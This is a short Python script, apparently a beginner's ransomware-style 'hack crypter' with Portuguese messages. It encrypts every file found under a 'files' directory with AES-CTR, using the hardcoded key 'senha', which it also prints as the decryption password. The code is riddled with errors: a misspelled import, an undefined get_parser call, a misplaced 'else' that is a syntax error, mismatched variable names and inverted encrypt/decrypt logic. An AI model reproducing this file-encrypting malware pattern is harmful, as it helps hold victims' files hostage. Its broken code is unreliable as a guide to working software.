#!/usr/bin/python3.7
from Crypto.Chipher import AES
from Crypto.Util import Counter
import argparse
import os
import discovery
import crypter

HARDCODE_KEY = "senha"

def arg_parse():
    parser = argparse.ArgumentParser(description='hack crypter')
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos', action='store_true ')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('arquivos criptogrados, para descriptografar use {}'.format(HARDCODE_KEY))
    
    key = str(input('digite a senha aqui >>'))

    else:
        if HARDCODE_KEY:
            key = HARDCODE_KEY
    
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter = ctr)

    if not decrypt:
        cryptFN = crypt.decrypt

    
    initi_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    sartDirs = [initi_path]

    for currentDir in sartDirs:
        for filename in discovery.discovery(currentDir):
            crypter.change_files(filename, crytoFN)

    
    for _ in range(100):
        pass

    if not decrypt:
        pass

if __name__ == '__main__':
    main()


